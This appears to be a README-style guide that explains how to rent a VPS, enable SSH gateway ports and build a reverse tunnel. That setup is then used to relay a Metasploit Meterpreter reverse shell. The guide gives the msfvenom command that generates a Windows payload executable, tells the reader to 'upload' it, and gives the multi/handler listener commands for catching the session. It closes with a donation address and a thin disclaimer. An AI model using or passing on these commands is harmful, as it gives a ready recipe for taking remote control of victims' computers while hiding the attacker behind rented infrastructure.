
<p align="center">
<img src="https://cdn-icons-png.flaticon.com/512/5062/5062696.png" width="30%" height="30%">
</p>

<h1 align="center"> SSH TUNNELING </h1>
<h4 align="center"> Welcome to my VPS Setup Blog! This guide will walk you through the process of buying a Virtual Private Server (VPS) with Ubuntu, configuring it for SSH access, and setting up a reverse tunnel.
</h4>

## Introduction

In this blog, we'll demonstrate how to setup a VPS and ssh tunnel, specifically one with 1GB RAM, 1 CPU, and a 25GB SSD, running Ubuntu. We'll enable SSH, set a password, configure the SSH server for port forwarding, and set up a reverse tunnel.

## Buy a VPS

1. Choose a VPS provider that meets your needs. For example, DigitalOcean, AWS, or Linode.
2. Select a VPS plan with 1GB RAM, 1 CPU, and a 25GB SSD.
3. During the setup process, choose Ubuntu as the operating system.

## Connect to Your VPS

After the VPS is set up, you can connect to it using SSH. Open your terminal and execute:

```bash
ssh root@your_vps_ip
```
Replace your_vps_ip with the actual IP address provided by your VPS provider.


## Configure SSH

Open the SSH configuration file:

```bash
nano /etc/ssh/sshd_config
```

Uncomment the following lines to enable TCP port forwarding:

```bash
AllowTcpForwarding yes
GatewayPorts yes
```
Exit the nano editor (usually by pressing Ctrl + X, then Y to confirm changes, and Enter to save).

## Reboot Your VPS

After making changes to the SSH configuration, it's a good practice to reboot your VPS:

```bash
reboot
```

Wait for the VPS to restart.

## Creating payload

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=vps_ip LPORT=7777 -f exe -o payload.exe
```
now upload you payload

## Set Up a Reverse Tunnel

To set up a reverse tunnel, execute the following command in your local machine's terminal:

```bash
ssh -R 7777:127.0.0.1:7777 root@your_vps_ip
```
Replace your_vps_ip with the actual IP address provided by your VPS provider. After executing this command, you can leave the SSH session on your local machine. This establishes a reverse tunnel

## Create a listener
```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST=127.0.0.1
set LPORT=7777
run
```
THEN WAIT FOR THE METERPRETER SESSION

## Support

If you find my work helpful and want to support me, consider making a donation. Your contribution will help me continue working on open-source projects.

**Bitcoin Address: `36ALguYpTgFF3RztL4h2uFb3cRMzQALAcm`**

<h1 align="center"> DISCLAIMER </h1>

<h4 align="center">I'm not responsible for anything you do with this program, so please only use it for good and educational purposes. </h4>



